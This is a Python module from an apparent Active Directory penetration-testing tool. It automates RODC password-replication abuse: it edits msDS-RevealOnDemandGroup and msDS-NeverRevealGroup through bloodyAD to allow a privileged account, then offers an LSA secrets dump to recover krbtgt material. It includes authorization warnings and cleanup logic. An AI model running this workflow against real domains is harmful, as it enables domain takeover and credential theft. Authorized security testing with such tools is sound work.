"""RODC follow-up workflow for compromised Read-Only Domain Controllers.

This follow-up targets the scenario where ADscan already controls an RODC
machine account and the operator wants to prepare password replication for a
privileged account on that RODC using ``bloodyAD``.
"""

from __future__ import annotations

from typing import Any, Iterable

from rich.prompt import Confirm, Prompt

from adscan_internal import print_error, print_info_debug, print_warning, telemetry
from adscan_internal.cli.ldap import derive_base_dn
from adscan_internal.principal_utils import normalize_machine_account
from adscan_internal.rich_output import (
    mark_sensitive,
    print_info,
    print_operation_header,
    print_panel,
    print_success,
    print_system_change_warning,
    strip_sensitive_markers,
)
from adscan_internal.services.pivot_opportunity_service import (
    maybe_offer_pivot_opportunity_for_host_viability,
)
from adscan_internal.services import ExploitationService
from adscan_internal.services.current_vantage_reachability_service import (
    CurrentVantageTargetAssessment,
    resolve_targets_from_current_vantage,
)


_RODC_ALLOWED_GROUP = "Allowed RODC Password Replication Group"
_RODC_REQUIRED_ACCESS_PORTS = (445, 5985, 5986, 3389)


def _normalize_attr_values(values: Iterable[str]) -> tuple[str, ...]:
    """Return trimmed multi-valued LDAP attribute values preserving order."""
    normalized: list[str] = []
    seen: set[str] = set()
    for raw_value in values:
        value = str(raw_value or "").strip()
        key = value.casefold()
        if not value or key in seen:
            continue
        seen.add(key)
        normalized.append(value)
    return tuple(normalized)


def _parse_bloodyad_multi_value_output(output: str) -> dict[str, tuple[str, ...]]:
    """Parse repeated ``key: value`` BloodyAD output lines into tuples."""
    values: dict[str, list[str]] = {}
    for raw_line in str(output or "").splitlines():
        line = str(raw_line or "").strip()
        if not line or ":" not in line:
            continue
        key, value = line.split(":", 1)
        key_clean = key.strip()
        value_clean = value.strip()
        if not key_clean or not value_clean:
            continue
        values.setdefault(key_clean, []).append(value_clean)
    return {
        key: _normalize_attr_values(raw_values)
        for key, raw_values in values.items()
    }


def _resolve_workspace_dir(shell: Any) -> str:
    """Return the effective workspace directory for current-vantage lookups."""
    if hasattr(shell, "_get_workspace_cwd"):
        return shell._get_workspace_cwd()  # type: ignore[attr-defined]
    return str(getattr(shell, "current_workspace_dir", "") or "")


def _first_hostname_candidate(
    assessment: CurrentVantageTargetAssessment,
    *,
    fallback_host: str,
) -> str:
    """Return a stable host identifier from a reachability assessment."""
    for candidate in assessment.matched_hostnames:
        clean = str(candidate or "").strip()
        if clean:
            return clean
    return str(fallback_host or "").strip()


def _build_rodc_target_candidates(domain: str, machine_account: str) -> tuple[str, ...]:
    """Return current-vantage target candidates for one RODC machine account."""
    normalized_machine = normalize_machine_account(machine_account)
    stem = normalized_machine.rstrip("$")
    domain_clean = str(domain or "").strip()
    candidates = [normalized_machine, stem]
    if stem and domain_clean:
        candidates.append(f"{stem}.{domain_clean}")
    return tuple(candidate for candidate in candidates if str(candidate or "").strip())


def _assess_rodc_host_followup_access(
    shell: Any,
    *,
    domain: str,
    machine_account: str,
) -> CurrentVantageTargetAssessment | None:
    """Return a reachable RODC host assessment or ``None`` when blocked."""
    normalized_machine = normalize_machine_account(machine_account)
    resolution = resolve_targets_from_current_vantage(
        _resolve_workspace_dir(shell),
        getattr(shell, "domains_dir", "domains"),
        domain,
        targets=_build_rodc_target_candidates(domain, normalized_machine),
        required_ports=_RODC_REQUIRED_ACCESS_PORTS,
    )
    marked_machine = mark_sensitive(machine_account, "user")
    marked_domain = mark_sensitive(domain, "domain")
    if not resolution.report_available:
        print_warning(
            f"RODC follow-up for {marked_machine}@{marked_domain} requires a current-vantage reachability report first."
        )
        return None

    assessment = next(iter(resolution.reachable_targets), None)
    if assessment is None:
        print_warning(
            f"RODC follow-up is blocked because ADscan cannot currently reach the host for {marked_machine}@{marked_domain} on an admin-capable service."
        )
        unmatched = resolution.unmatched_targets
        unreachable = resolution.unreachable_targets
        if unmatched:
            maybe_offer_pivot_opportunity_for_host_viability(
                shell,
                domain=domain,
                blocked_target=normalized_machine,
                viability_status="enabled_but_unresolved",
                operator_summary=(
                    "The RODC host was not resolved in the current-vantage inventory. "
                    "Refresh network reachability before retrying."
                ),
            )
        elif unreachable:
            maybe_offer_pivot_opportunity_for_host_viability(
                shell,
                domain=domain,
                blocked_target=normalized_machine,
                viability_status="resolved_but_unreachable",
                operator_summary=(
                    "The RODC host resolved in the current-vantage inventory, but the expected "
                    "admin-capable ports are not reachable from the current vantage."
                ),
            )
        return None

    print_info_debug(
        "[rodc] current-vantage follow-up access confirmed: "
        f"target={mark_sensitive(_first_hostname_candidate(assessment, fallback_host=machine_account.rstrip('$')), 'hostname')} "
        f"ports={mark_sensitive(','.join(str(port) for port in assessment.open_ports), 'detail')}"
    )
    return assessment


def _resolve_object_dn(
    service: ExploitationService,
    *,
    pdc_host: str,
    bloody_path: str,
    domain: str,
    username: str,
    password: str,
    target_object: str,
) -> str | None:
    """Resolve one object's distinguished name via BloodyAD."""
    result = service.acl.get_object_attributes(
        pdc_host=pdc_host,
        bloody_path=bloody_path,
        domain=domain,
        username=username,
        password=password,
        target_object=target_object,
        attribute_names=("distinguishedName",),
        kerberos=True,
    )
    if not result.success:
        return None
    return str(
        result.attributes.get("distinguishedName")
        or result.attributes.get("distinguishedname")
        or ""
    ).strip() or None


def _load_rodc_attribute_state(
    service: ExploitationService,
    *,
    pdc_host: str,
    bloody_path: str,
    domain: str,
    username: str,
    password: str,
    target_object: str,
) -> tuple[str | None, tuple[str, ...], tuple[str, ...]]:
    """Return current RODC DN, RevealOnDemand values, and NeverReveal values."""
    result = service.acl.get_object_attributes(
        pdc_host=pdc_host,
        bloody_path=bloody_path,
        domain=domain,
        username=username,
        password=password,
        target_object=target_object,
        attribute_names=(
            "distinguishedName",
            "msDS-RevealOnDemandGroup",
            "msDS-NeverRevealGroup",
        ),
        kerberos=True,
    )
    if not result.success:
        return None, (), ()
    parsed = _parse_bloodyad_multi_value_output(result.raw_output or "")
    rodc_dn = str(
        result.attributes.get("distinguishedName")
        or result.attributes.get("distinguishedname")
        or ""
    ).strip() or None
    reveal_values = parsed.get("msDS-RevealOnDemandGroup", ())
    never_reveal_values = parsed.get("msDS-NeverRevealGroup", ())
    return rodc_dn, reveal_values, never_reveal_values


def _restore_rodc_attribute_state(
    service: ExploitationService,
    *,
    pdc_host: str,
    bloody_path: str,
    domain: str,
    username: str,
    password: str,
    target_object: str,
    reveal_values: tuple[str, ...],
    never_reveal_values: tuple[str, ...],
) -> bool:
    """Restore the RODC password-replication attributes to their original state."""
    reveal_restore = service.acl.set_object_attribute_values(
        pdc_host=pdc_host,
        bloody_path=bloody_path,
        domain=domain,
        username=username,
        password=password,
        target_object=target_object,
        attribute_name="msDS-RevealOnDemandGroup",
        attribute_values=reveal_values,
        kerberos=True,
    )
    never_reveal_restore = service.acl.set_object_attribute_values(
        pdc_host=pdc_host,
        bloody_path=bloody_path,
        domain=domain,
        username=username,
        password=password,
        target_object=target_object,
        attribute_name="msDS-NeverRevealGroup",
        attribute_values=never_reveal_values,
        kerberos=True,
    )
    return bool(reveal_restore.success and never_reveal_restore.success)


def _format_rodc_restore_values(values: tuple[str, ...]) -> str:
    """Render original LDAP attribute values for operator-facing cleanup guidance."""
    if not values:
        return "(clear this attribute)"
    return "\n".join(f"- {mark_sensitive(value, 'path')}" for value in values)


def _print_rodc_cleanup_manual_guidance(
    *,
    domain: str,
    rodc_machine: str,
    reveal_values: tuple[str, ...],
    never_reveal_values: tuple[str, ...],
) -> None:
    """Show actionable manual cleanup guidance when automatic restore fails."""
    marked_domain = mark_sensitive(domain, "domain")
    marked_rodc = mark_sensitive(rodc_machine, "user")
    print_warning(
        f"RODC follow-up cleanup did not complete. Review and restore the original password-replication attributes on {marked_rodc} in {marked_domain}."
    )
    print_panel(
        "\n".join(
            [
                "Automatic cleanup failed. Restore the RODC object manually to avoid leaving password-replication changes behind.",
                "",
                "Restore `msDS-RevealOnDemandGroup` to:",
                _format_rodc_restore_values(reveal_values),
                "",
                "Restore `msDS-NeverRevealGroup` to:",
                _format_rodc_restore_values(never_reveal_values),
            ]
        ),
        title="[bold yellow]Manual Cleanup Required[/bold yellow]",
        border_style="yellow",
        expand=False,
    )


def _maybe_dump_rodc_lsa(
    shell: Any,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
) -> bool:
    """Offer an immediate LSA dump against the prepared RODC over SMB."""
    marked_host = mark_sensitive(host, "hostname")
    marked_username = mark_sensitive(username, "user")
    if not getattr(shell, "auto", False) and not Confirm.ask(
        f"Dump LSA secrets from {marked_host} now using {marked_username}?",
        default=True,
    ):
        print_info(
            f"Skipping the automatic RODC LSA dump for {marked_host} by user choice."
        )
        return False

    shell.dump_lsa(
        domain,
        username,
        password,
        host,
        "false",
        include_machine_accounts=True,
    )
    return True


def offer_rodc_escalation(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> bool:
    """Prepare password replication abuse on a compromised RODC machine account."""
    cleanup_required = False
    cleanup_completed = False
    original_reveal_values: tuple[str, ...] = ()
    original_never_reveal_values: tuple[str, ...] = ()
    service: ExploitationService | None = None
    pdc_host = ""
    bloody_path = ""
    normalized_machine = normalize_machine_account(username)
    try:
        if getattr(shell, "get_user_dc_role", None) is not None:
            dc_role = shell.get_user_dc_role(domain, normalized_machine)
            if dc_role != "rodc":
                print_warning(
                    f"{mark_sensitive(normalized_machine, 'user')} is not classified as a Read-Only Domain Controller in {mark_sensitive(domain, 'domain')}."
                )
                return False

        assessment = _assess_rodc_host_followup_access(
            shell,
            domain=domain,
            machine_account=normalized_machine,
        )
        if assessment is None:
            return False

        domain_data = getattr(shell, "domains_data", {}).get(domain, {})
        pdc_host = str(
            domain_data.get("pdc_hostname_fqdn")
            or domain_data.get("pdc_hostname")
            or domain_data.get("pdc")
            or ""
        ).strip()
        bloody_path = str(getattr(shell, "bloodyad_path", "") or "").strip()
        if not pdc_host or not bloody_path:
            print_error("RODC follow-up requires a reachable DC and bloodyAD.")
            return False

        default_target_user = str(
            domain_data.get("rodc_followup_default_user") or "Administrator"
        ).strip()
        print_operation_header(
            "RODC Follow-up",
            details={
                "Domain": domain,
                "RODC": normalized_machine,
                "Reachable Host": _first_hostname_candidate(
                    assessment,
                    fallback_host=normalized_machine.rstrip("$"),
                ),
                "Actor": username,
            },
            icon="🧱",
        )
        if not getattr(shell, "auto", False):
            print_system_change_warning(
                title="[bold yellow]RODC Follow-up Warning[/bold yellow]",
                summary=(
                    "This follow-up changes the RODC object's password-replication policy in Active Directory. "
                    "ADscan will update LDAP attributes on the RODC object before attempting the follow-up."
                ),
                planned_changes=[
                    "Add the selected privileged account to msDS-RevealOnDemandGroup.",
                    "If needed, remove that account from msDS-NeverRevealGroup.",
                ],
                impact_notes=[
                    "This can allow privileged credentials to be replicated or cached on the RODC.",
                    "ADscan will try to restore the original LDAP attribute values during cleanup.",
                ],
                cleanup_notes=[
                    "Cleanup restores the directory settings, but it may not undo credential material already cached on the RODC.",
                ],
                authorization_note=(
                    "Only continue if you are explicitly authorized to make temporary AD changes in this environment."
                ),
            )
            if not Confirm.ask(
                "Proceed with the RODC follow-up now?",
                default=True,
            ):
                print_info("Skipping RODC follow-up by user choice.")
                return False

        target_user = Prompt.ask(
            "Privileged user to allow on the RODC",
            default=default_target_user,
        )
        target_user = strip_sensitive_markers(target_user).strip() or default_target_user

        service = ExploitationService()
        target_user_dn = _resolve_object_dn(
            service,
            pdc_host=pdc_host,
            bloody_path=bloody_path,
            domain=domain,
            username=username,
            password=password,
            target_object=target_user,
        )
        if not target_user_dn:
            print_error(
                f"Could not resolve Distinguished Name for {mark_sensitive(target_user, 'user')}."
            )
            return False

        allowed_group_dn = _resolve_object_dn(
            service,
            pdc_host=pdc_host,
            bloody_path=bloody_path,
            domain=domain,
            username=username,
            password=password,
            target_object=_RODC_ALLOWED_GROUP,
        )
        if not allowed_group_dn:
            allowed_group_dn = (
                f"CN={_RODC_ALLOWED_GROUP},CN=Users,{derive_base_dn(domain)}"
            )
            print_info_debug(
                "[rodc] Falling back to canonical DN for Allowed RODC Password Replication Group: "
                f"{mark_sensitive(allowed_group_dn, 'path')}"
            )

        rodc_dn, reveal_values, never_reveal_values = _load_rodc_attribute_state(
            service,
            pdc_host=pdc_host,
            bloody_path=bloody_path,
            domain=domain,
            username=username,
            password=password,
            target_object=normalized_machine,
        )
        if not rodc_dn:
            print_error(
                f"Could not read the RODC object state for {mark_sensitive(normalized_machine, 'user')}."
            )
            return False
        original_reveal_values = tuple(reveal_values)
        original_never_reveal_values = tuple(never_reveal_values)

        updated_reveal_values = _normalize_attr_values(
            [*reveal_values, allowed_group_dn, target_user_dn]
        )
        reveal_update = service.acl.set_object_attribute_values(
            pdc_host=pdc_host,
            bloody_path=bloody_path,
            domain=domain,
            username=username,
            password=password,
            target_object=normalized_machine,
            attribute_name="msDS-RevealOnDemandGroup",
            attribute_values=updated_reveal_values,
            kerberos=True,
        )
        if not reveal_update.success:
            print_error(
                "Failed to update msDS-RevealOnDemandGroup on the RODC object."
            )
            return False
        cleanup_required = True

        removed_from_never_reveal = False
        if any(value.casefold() == target_user_dn.casefold() for value in never_reveal_values):
            updated_never_reveal_values = tuple(
                value
                for value in never_reveal_values
                if value.casefold() != target_user_dn.casefold()
            )
            never_reveal_update = service.acl.set_object_attribute_values(
                pdc_host=pdc_host,
                bloody_path=bloody_path,
                domain=domain,
                username=username,
                password=password,
                target_object=normalized_machine,
                attribute_name="msDS-NeverRevealGroup",
                attribute_values=updated_never_reveal_values,
                kerberos=True,
            )
            if not never_reveal_update.success:
                print_error(
                    "Failed to update msDS-NeverRevealGroup on the RODC object."
                )
                return False
            removed_from_never_reveal = True

        marked_target_user = mark_sensitive(target_user, "user")
        marked_rodc = mark_sensitive(normalized_machine, "user")
        marked_domain = mark_sensitive(domain, "domain")
        print_success(
            f"RODC follow-up prepared password replication for {marked_target_user} on {marked_rodc} in {marked_domain}."
        )
        summary_lines = [
            f"RODC object DN: {mark_sensitive(rodc_dn, 'path')}",
            f"Target account DN: {mark_sensitive(target_user_dn, 'path')}",
            "Updated attribute: msDS-RevealOnDemandGroup",
        ]
        if removed_from_never_reveal:
            summary_lines.append(
                "Updated attribute: msDS-NeverRevealGroup (target removed)"
            )
        print_panel(
            "\n".join(summary_lines),
            title="[bold green]RODC Follow-up Applied[/bold green]",
            border_style="green",
            expand=False,
        )

        preferred_host = _first_hostname_candidate(
            assessment,
            fallback_host=normalized_machine.rstrip("$"),
        )
        if 445 in set(assessment.open_ports):
            _maybe_dump_rodc_lsa(
                shell,
                domain=domain,
                host=preferred_host,
                username=username,
                password=password,
            )
        else:
            print_info(
                f"Next step: authenticate to {mark_sensitive(preferred_host, 'hostname')} as {mark_sensitive(username, 'user')} and dump the RODC LSA secrets to recover the local krbtgt material."
            )
        return True
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("RODC follow-up encountered an error.")
        print_info_debug(f"[rodc] escalation helper failed: {exc}")
        return False
    finally:
        if cleanup_required and service is not None and pdc_host and bloody_path:
            cleanup_completed = _restore_rodc_attribute_state(
                service,
                pdc_host=pdc_host,
                bloody_path=bloody_path,
                domain=domain,
                username=username,
                password=password,
                target_object=normalized_machine,
                reveal_values=original_reveal_values,
                never_reveal_values=original_never_reveal_values,
            )
            marked_rodc = mark_sensitive(normalized_machine, "user")
            marked_domain = mark_sensitive(domain, "domain")
            if cleanup_completed:
                print_info(
                    f"RODC follow-up cleanup completed: restored the original password-replication attributes on {marked_rodc} in {marked_domain}."
                )
            else:
                _print_rodc_cleanup_manual_guidance(
                    domain=domain,
                    rodc_machine=normalized_machine,
                    reveal_values=original_reveal_values,
                    never_reveal_values=original_never_reveal_values,
                )


__all__ = ["offer_rodc_escalation"]
